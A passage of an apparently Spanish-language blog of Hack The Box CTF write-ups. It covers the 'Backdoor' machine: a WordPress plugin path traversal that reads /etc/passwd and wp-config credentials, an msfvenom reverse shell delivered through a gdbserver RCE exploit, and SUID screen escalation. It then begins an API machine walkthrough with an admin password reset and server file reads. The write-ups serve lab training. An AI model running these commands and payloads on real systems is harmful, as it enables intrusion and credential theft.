Podemos verificar que el exploit funciona mediante curl:\n$ curl 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/hosts' /etc/hosts/etc/hosts/etc/hosts127.0.0.1 localhost 127.0.1.1 backdoor # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters \u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt;  Se observa que la primera y la última línea contiene información que no interesa. Para evitar que se muestre, podemos encapsular la petición GET en un script en Python llamado dpt.py para filtrar el contenido de la respuesta y quedarnos con lo que nos interesa (explicación detallada aquí). Ahora, podemos leer los archivos mejor, por ejemplo, /etc/passwd:\n$ python3 dpt.py /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin user:x:1000:1000:user:/home/user:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false  Podemos analizar la configuración de Wordpress en el archivo wp-config.php:\n$ python3 dpt.py /var/www/html/wp-config.php  \u0026lt;?php // ... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'wordpressuser' ); /** MySQL database password */ define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); /** Database charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8' ); /** The database collate type. Don't change this if in doubt. */ define( 'DB_COLLATE', '' ); // ... require_once ABSPATH . 'wp-settings.php';  Aquí encontramos unas credenciales para acceder a MySQL. Sin embargo, MySQL no está expuesto y no tenemos ningún tipo de acceso a la máquina. Tampoco podemos acceder al panel de administración de Wordpress (/wp-admin) utilizando la contraseña encontrada ni tampoco entrar por SSH a la máquina.\nEnumeración de procesos En este punto, podemos recordar que había otro puerto abierto en la máquina, el puerto 1337.\nUtilizando el plugin de Wordpress, podemos listar todos los procesos en ejecución desde el archivo /proc/sched_debug. Como hay una gran cantidad de procesos, podemos empezar filtrando por aquellos que contengan sh, para ver aquellos que se están ejecutando en una sesión de consola de comandos:\n$ python3 dpt.py /proc/sched_debug | grep sh I kdmflush 342 1982.495633 2 100 0.000000 0.017011 0.000000 0 0 / S sh 958 1022.736050 390 120 0.000000 82.017080 0.000000 0 0 /autogroup-67 S sshd 968 10.389860 10 120 0.000000 12.014977 0.000000 0 0 /autogroup-72 S ib_pg_flush_co 1013 1111.061054 220 120 0.000000 18.966596 0.000000 0 0 /autogroup-79 S bash 995 0.499467 2 120 0.000000 2.034465 0.000000 0 0 /autogroup-81 I kdmflush 340 1996.290992 2 100 0.000000 0.011462 0.000000 0 0 / S sh 959 0.004608 2 120 0.000000 1.493881 0.000000 0 0 /autogroup-68 S ib_log_flush 1029 295.362337 2107 120 0.000000 46.223983 0.000000 0 0 /autogroup-79 S bash 1018 40.675562 46 120 0.000000 27.889225 0.000000 0 0 /autogroup-83  Lo bueno del archivo /proc/sched_debug es que tenemos el PID (identificador de proceso) en la tercera columna empezando por la izquierda. Ahora podemos obtener información más detallada acerca de un proceso específico. Accediendo a /proc/\u0026lt;PID\u0026gt;/cmdline, podremos ver cómo se ha iniciado el proceso; /proc/\u0026lt;PID\u0026gt;/environ nos lista las variables de entorno configuradas para ejecutar el proceso; y /proc/\u0026lt;PID\u0026gt;/fd/\u0026lt;FD\u0026gt; mostrará el descriptor de archivo especificado para el proceso (0 para stdin, 1 para stdout, 2 para stderr, etc.).\nEsta vez, mostrar los comandos es más interesante. Utilizando algunos de los identificadores de proceso anteriores, podemos ver dos comandos curiosos:\n$ python3 dpt.py /proc/958/cmdline /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done $ python3 dpt.py /proc/959/cmdline /bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done  De momento, nos centraremos en el segundo. Se está ejecutando gdbserver en el puerto 1337 para depurar un archivo binario (/bin/true).\nPodemos verificar que el proceso está en ejecución filtrando por gdbserver en el archivo /proc/sched_debug:\n$ python3 dpt.py /proc/sched_debug | grep gdbserver S gdbserver 996 3.421556 16 120 0.000000 2.985488 0.000000 0 0 /autogroup-81 $ python3 dpt.py /proc/996/cmdline gdbserver--once0.0.0.0:1337/bin/true  Por tanto, parece que el vector de entrada es gdbserver. Este es el comando en ejecución:\ngdbserver --once 0.0.0.0:1337 /bin/true  RCE en gdbserver Podemos conectarnos a la instancia de gdbserver desde una sesión local de gdb (utilizando target remote 10.10.11.125:1337). Sin embargo, no es trivial interactuar con el servidor de esta manera.\nBuscando exploits, podemos encontrar un módulo de Metasploit (multi/gdb/gdb_server_exec). Este módulo funciona correctamente y devuelve una consola de comandos. Sin embargo, he decidido comprender el funcionamiento del módulo y escribir un exploit en Python llamado pwn_gdbserver.py para conseguir ejecución remota de comandos (explicación detallada aquí).\nEl exploit también se puede encontrar en ExploitDB y utilizando searchsploit:\n$ searchsploit gdbserver ---------------------------------------------------- ----------------------- Exploit Title | Path ---------------------------------------------------- ----------------------- GNU gdbserver 9.2 - Remote Command Execution (RCE) | linux/remote/50539.py ---------------------------------------------------- ----------------------- Shellcodes: No Results  Para utilizar mi exploit, es necesario generar un payload con msfvenom con esta instrucción:\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 PrependFork=true -o rev.bin [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 106 bytes Saved as: rev.bin  Después, podemos lanzar el exploit de la siguiente manera:\n$ python3 pwn-gdbserver.py 10.10.11.125:1337 rev.bin [+] Connected to target. Preparing exploit [+] Found x64 arch [+] Sending payload [*] Pwned!! Check your listener  Y entonces obtenemos una conexión en nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.125. Ncat: Connection from 10.10.11.125:39166. script /dev/null -c bash Script started, file is /dev/null user@Backdoor:/home/user$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm user@Backdoor:/home/user$ export TERM=xterm user@Backdoor:/home/user$ export SHELL=bash user@Backdoor:/home/user$ stty rows 50 columns 158  En este punto, podemos obtener la flag user.txt:\nuser@Backdoor:/home/user$ cat user.txt 424f67d5081afb1323b9772953cb0ac1  Enumeración del sistema Con una básica enumeración, podemos ver que el binario /usr/bin/screen tiene permisos SUID:\nuser@Backdoor:/home/user$ find / -perm -4000 2/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/chfn /usr/bin/gpasswd /usr/bin/at /usr/bin/su /usr/bin/sudo /usr/bin/newgrp /usr/bin/fusermount /usr/bin/screen /usr/bin/umount /usr/bin/mount /usr/bin/chsh /usr/bin/pkexec  Recordemos que había un proceso extraño en ejecución. Lo vimos mediante el plugin vulnerable de Wordpress:\n$ python3 dpt.py /proc/958/cmdline /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done  Básicamente, el comando está comprobando cada segundo que el directorio /var/run/screen/S-root/ está vacío. Si está vacío, entonces se ejecuta screen -dmS root.\nLeyendo el panel de ayuda de screen vemos que:\n-dmS name Start as daemon: Screen session in detached mode.  Escalada de privilegios Entonces, root se ha creado una sesión llamada root en segundo plano. Como screen es SUID, será ejecutado como el usuario propietario (root) si lo ejecuta cualquier otro usuario. Consecuentemente, como user somos capaces de entrar a la sesión de screen del usuario root de la siguiente manera (nótese que un root se refiere al nombre de usuario y el otro se refiere al nombre de la sesión):\nuser@Backdoor:/home/user$ screen -r root/root  root@Backdoor:~# cat root.txt 631c03c28fc182a3a4128ec8b39e2fb3  Aclaración Esto no es un problema de seguridad en screen. El problema está en que se ha configurado explícitamente para ser inseguro:\nroot@Backdoor:~# ls -la total 48 drwx------ 7 root root 4096 Apr 23 05:53 . drwxr-xr-x 19 root root 4096 Nov 15 13:49 .. lrwxrwxrwx 1 root root 9 Jul 18 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 2 root root 4096 Nov 10 14:18 .cache drwx------ 3 root root 4096 Nov 10 14:18 .config drwxr-xr-x 3 root root 4096 Nov 10 14:18 .local lrwxrwxrwx 1 root root 9 Nov 6 21:40 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 161 Dec 5 2019 .profile drwxr-xr-x 2 root root 4096 Nov 10 14:18 .reset -rw-r--r-- 1 root root 33 Apr 23 00:31 root.txt -rw-r--r-- 1 root root 42 Apr 23 00:30 .screenrc -rw-r--r-- 1 root root 66 Apr 23 05:53 .selected_editor drwx------ 2 root root 4096 Nov 10 14:18 .ssh root@Backdoor:~# cat .screenrc multiuser on acladd user shell -/bin/bash  El archivo .screenrc indica que screen sea multi-usuario y que permita al usuario llamado user acceder a las sesiones de root. La configuración por defecto de screen hará que cada sesión sea privada para cada usuario, incluso si el binario es SUID.\nPara probar que esto es cierto, vamos a vaciar el archivo .screenrc y tratar de conectarnos otra vez a la sesión de root:\nroot@Backdoor:~# echo \u0026gt; .screenrc root@Backdoor:~# exit  [screen is terminating] user@Backdoor:/home/user$ screen -r root/root There is a screen on: 1741.root (01/02/22 12:34:56) (Private) There is no screen to be attached matching root.  Y no es posible, screen hace las sesiones privadas por defecto.\nResumiendo, esta escalada de privilegios ha sido posible porque screen es SUID y root configuró sus sesiones como multi-usuario y permitió explícitamente al usuario user acceder a sus sesiones (más información aquí).\n","image":"/images/HTB/Backdoor/Backdoor.png","permalink":"https://7rocky.github.io/htb/backdoor/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina contiene una página web de Wordpress que tiene un plugin vulnerable a navegación de directorios, que se puede utilizar para enumerar procesos en ejecución, y después un binario SUID. Para comprometer esta máquina es necesario tener conocimientos sobre Wordpress y experiencia con vulnerabilidades de inclusión de archivos. En este write-up se utiliza un script de Python personalizado para leer archivos del servidor y un exploit público propio para ganar acceso a la máquina","time":7,"title":"Backdoor"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.161   Fecha: 12 / 04 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.161 -p 22,80 Nmap scan report for 10.10.11.161 Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http uvicorn |_http-server-header: uvicorn | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | content-type: text/plain; charset=utf-8 | Connection: close | Invalid HTTP request received. | FourOhFourRequest: | HTTP/1.1 404 Not Found | date: | server: uvicorn | content-length: 22 | content-type: application/json | Connection: close | {\"detail\":\"Not Found\"} | GetRequest: | HTTP/1.1 200 OK | date: | server: uvicorn | content-length: 29 | content-type: application/json | Connection: close | {\"msg\":\"UHC API Version 1.0\"} | HTTPOptions: | HTTP/1.1 405 Method Not Allowed | date: | server: uvicorn | content-length: 31 | content-type: application/json | Connection: close |_ {\"detail\":\"Method Not Allowed\"} |_http-title: Site doesn't have a title (application/json). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 80.81 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración La máquina aloja una API, podemos interactuar con ella directamente desde línea de comandos con curl:\n$ curl 10.10.11.161 {\"msg\":\"UHC API Version 1.0\"} $ curl -i 10.10.11.161 HTTP/1.1 200 OK date: server: uvicorn content-length: 29 content-type: application/json {\"msg\":\"UHC API Version 1.0\"}  Está montada con uvicorn. Si aplicamos fuzzing, veremos dos rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.161/FUZZ docs [Status: 401, Size: 30, Words: 2, Lines: 1, Duration: 204ms] api [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 155ms] [Status: 200, Size: 29, Words: 4, Lines: 1, Duration: 198ms]  Enumeración de API No tenemos acceso a la ruta /docs:\n$ curl -i 10.10.11.161/docs HTTP/1.1 401 Unauthorized date: server: uvicorn www-authenticate: Bearer content-length: 30 content-type: application/json {\"detail\":\"Not authenticated\"}  Y por otro lado, /api muestra una ruta más:\n$ curl -i 10.10.11.161/api HTTP/1.1 200 OK date: server: uvicorn content-length: 20 content-type: application/json {\"endpoints\":[\"v1\"]}  Y dos rutas más:\n$ curl -i 10.10.11.161/api/v1 HTTP/1.1 200 OK date: server: uvicorn content-length: 30 content-type: application/json {\"endpoints\":[\"user\",\"admin\"]}  Pero no podemos acceder directamente:\n$ curl -i 10.10.11.161/api/v1/user HTTP/1.1 404 Not Found date: server: uvicorn content-length: 22 content-type: application/json {\"detail\":\"Not Found\"} $ curl -i 10.10.11.161/api/v1/admin HTTP/1.1 307 Temporary Redirect date: server: uvicorn location: http://10.10.11.161/api/v1/admin/ Transfer-Encoding: chunked $ curl -i 10.10.11.161/api/v1/admin/ HTTP/1.1 401 Unauthorized date: server: uvicorn www-authenticate: Bearer content-length: 30 content-type: application/json {\"detail\":\"Not authenticated\"}  Podemos tratar de aplicar fuzzing para ver más rutas aunque no tengamos permiso:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/admin/FUZZ file [Status: 405, Size: 31, Words: 3, Lines: 1, Duration: 115ms]  $ curl -iX POST 10.10.11.161/api/v1/admin/file HTTP/1.1 401 Unauthorized date: server: uvicorn www-authenticate: Bearer content-length: 30 content-type: application/json {\"detail\":\"Not authenticated\"}  Vemos que necesitamos autenticación, probablemente basada en JSON Web Token (JWT) debido a la cabecera de respuesta www-authenticate: Bearer.\nComo necesitamos autenticarnos, tenemos que encontrar una manera de crear una cuenta. Vemos que /api/v1/user/asdf responde con información útil (de hechom cualquier palabra puesta después de /api/v1/user/):\n$ curl -i 10.10.11.161/api/v1/user/asdf HTTP/1.1 422 Unprocessable Entity date: server: uvicorn content-length: 104 content-type: application/json {\"detail\":[{\"loc\":[\"path\",\"user_id\"],\"msg\":\"value is not a valid integer\",\"type\":\"type_error.integer\"}]} $ curl -s 10.10.11.161/api/v1/user/asdf | jq { \"detail\": [ { \"loc\": [ \"path\", \"user_id\" ], \"msg\": \"value is not a valid integer\", \"type\": \"type_error.integer\" } ] }  Este error nos dice que el valor indicado no es un número entero. Por tanto, vamos a probar con un número:\n$ curl -i 10.10.11.161/api/v1/user/1 HTTP/1.1 200 OK date: server: uvicorn content-length: 141 content-type: application/json {\"guid\":\"36c2e94a-4271-4259-93bf-c96ad5948284\",\"email\":\"admin@htb.local\",\"date\":null,\"time_created\":1649533388111,\"is_superuser\":true,\"id\":1} $ curl -s 10.10.11.161/api/v1/user/1 | jq { \"guid\": \"36c2e94a-4271-4259-93bf-c96ad5948284\", \"email\": \"admin@htb.local\", \"date\": null, \"time_created\": 1649533388111, \"is_superuser\": true, \"id\": 1 }  Con esto, vemos que existen usuarios registrados en la API (enumeración de usuarios). Vamos a tratar de registrarnos.\nRegistrando una nueva cuenta El método HTTP usual para realizar esta acción en una API es POST:\n$ curl -iX POST 10.10.11.161/api/v1/user/signup HTTP/1.1 422 Unprocessable Entity date: server: uvicorn content-length: 81 content-type: application/json {\"detail\":[{\"loc\":[\"body\"],\"msg\":\"field required\",\"type\":\"value_error.missing\"}]} $ curl -sX POST 10.10.11.161/api/v1/user/signup | jq { \"detail\": [ { \"loc\": [ \"body\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" } ] }  Este error es evidente porque no hemos puesto ningún cuerpo de petición. Vamos a usar un documento JSON vacío:\n$ curl 10.10.11.161/api/v1/user/signup -d '{}' -sH 'Content-Type: application/json' | jq { \"detail\": [ { \"loc\": [ \"body\", \"email\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" }, { \"loc\": [ \"body\", \"password\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" } ] }  Y aquí vemos los campos requeridos: email y password. Ahora podemos crear la cuenta:\n$ curl 10.10.11.161/api/v1/user/signup -d '{\"email\":\"7rocky@htb.local\",\"password\":\"asdffdsa\"}'' -sH 'Content-Type: application/json' | jq {}  No hay respuesta, pero podemos asumir que la cuenta se ha creado. Vamos a intentar iniciar sesión:\n$ curl 10.10.11.161/api/v1/user/login -d '{\"email\":\"7rocky@htb.local\",\"password\":\"asdffdsa\"}'' -sH 'Content-Type: application/json' | jq { \"detail\": [ { \"loc\": [ \"body\", \"username\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" }, { \"loc\": [ \"body\", \"password\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" } ] }  Este error dice que email debería ser reemplazado por username. Pero tampoco funciona:\n$ curl 10.10.11.161/api/v1/user/login -d '{\"username\":\"7rocky@htb.local\",\"password\":\"asdffdsa\"}'' -sH 'Content-Type: application/json' | jq { \"detail\": [ { \"loc\": [ \"body\", \"username\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" }, { \"loc\": [ \"body\", \"password\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" } ] }  Vamos a cambiar el formato del cuerpo a application/x-www-form-urlencoded (el formato por defecto en curl):\n$ curl 10.10.11.161/api/v1/user/login -sd 'username=7rocky@htb.local\u0026password=asdffdsa' | jq { \"access_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg\", \"token_type\": \"bearer\" }  Y ahí tenemos el token JWT. Vamos a decodificarlo en jwt.io:\nHay una clave llamada is_superuser, que está en false. Parece claro que tenemos que generar un token que tenga is_superuser en true.\nLeyendo la documentación Vamos a ver la ruta /docs usando el token:\n$ curl 10.10.11.161/docs -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg' \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link type=\"text/css\" rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css\"\u0026gt; \u0026lt;link rel=\"shortcut icon\" href=\"https://fastapi.tiangolo.com/img/favicon.png\"\u0026gt; \u0026lt;title\u0026gt;docs\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\"swagger-ui\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\"https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!-- `SwaggerUIBundle` is now available on the page --\u0026gt; \u0026lt;script\u0026gt; const ui = SwaggerUIBundle({ url: '/openapi.json', \"dom_id\": \"#swagger-ui\", \"layout\": \"BaseLayout\", \"deepLinking\": true, \"showExtensions\": true, \"showCommonExtensions\": true, presets: [ SwaggerUIBundle.presets.apis, SwaggerUIBundle.SwaggerUIStandalonePreset ], }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Para ver esta respuesta en el navegador, podemos usar Burp Suite para interceptar la petición, poner la cabecera Authorization y renderizar el contenido de la respuesta en Burp Suite (Repeater):\nAquí hay un error al solicitar openapi.json porque la cabecera Authorization no está configurada para esa petición en particular. En su lugar, podemos descargar el archivo con curl:\n$ curl 10.10.11.161/openapi.json -o openapi.json -sH 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg'  Y luego lo importamos en Swagger:\nY estas son todas las rutas disponibles:\nEn este punto, podemos ver la flag user.txt con una petición PUT a /api/v1/user/SecretFlagEndpoint:\n$ curl -X PUT 10.10.11.161/api/v1/user/SecretFlagEndpoint {\"user.txt\":\"50b343d5b2d4d836abdc7320b87ee384\"}  Acceso a la máquina Hay una ruta /api/v1/user/updatepass que solamente necesita unos pocos parámetros:\nObteniendo un usuario privilegiado Solo el guid y la nueva contraseña (password). A lo mejor somos capaces de cambiar la contraseña de admin (su guid es 36c2e94a-4271-4259-93bf-c96ad5948284):\n$ curl -s 10.10.11.161/api/v1/user/1 | jq { \"guid\": \"36c2e94a-4271-4259-93bf-c96ad5948284\", \"email\": \"admin@htb.local\", \"date\": null, \"time_created\": 1649533388111, \"is_superuser\": true, \"id\": 1 } $ curl 10.10.11.161/api/v1/user/updatepass -d '{\"guid\":\"36c2e94a-4271-4259-93bf-c96ad5948284\",\"password\":\"asdffdsa\"}' -sH 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg' | jq { \"date\": null, \"id\": 1, \"is_superuser\": true, \"hashed_password\": \"$2b$12$Fqdwt6M5VTxcCM3VSxctwe3o5IUhuWSnSeOHvxNd8GPgUxzW1XoqS\", \"guid\": \"36c2e94a-4271-4259-93bf-c96ad5948284\", \"email\": \"admin@htb.local\", \"time_created\": 1649533388111, \"last_update\": null }  Y ahora podemos iniciar sesión como admin, tenemos su token JWT:\n$ curl 10.10.11.161/api/v1/user/login -sd 'username=admin@htb.local\u0026password=asdffdsa' | jq { \"access_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw\", \"token_type\": \"bearer\" }  Hay una ruta que permite a los usuarios privilegiados ejecutar comandos:\nVamos a probar pues:\n$ curl 10.10.11.161/api/v1/admin/exec/whoami -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw' {\"detail\":\"Debug key missing from JWT\"}  Pero aún no podemos, necesitamos añadir una clave debug en el token JWT para habilitar la ejecución de comandos.\nLeyendo archivos del servidor Hay otra ruta interesante que permite leer archivos del servidor (la vimos antes con ffuf):\nEste es el archivo /etc/passwd:\n$ curl 10.10.11.161/api/v1/admin/file -d '{\"file\":\"/etc/passwd\"}' -H 'Content-Type: application/json' -sH 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw' {\"file\":\"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\\ntss:x:106:111:TPM software 